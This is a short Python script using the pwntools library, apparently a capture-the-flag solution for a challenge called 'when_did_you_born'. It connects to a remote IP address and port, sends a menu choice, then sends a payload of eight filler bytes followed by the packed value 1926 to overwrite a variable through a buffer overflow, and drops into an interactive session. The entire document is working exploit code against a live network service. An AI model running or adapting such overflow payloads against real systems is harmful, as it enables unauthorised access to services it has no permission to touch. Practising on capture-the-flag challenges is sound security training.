from pwn import *

#sh = process('./when_did_you_born')
sh = remote('111.198.29.45',30166)

target_addr = p32(0x004008fc)

payload = 'a' * 8 + p32(1926)

sh.sendline('2')

sleep(1)

sh.sendline(payload)

sh.interactive()
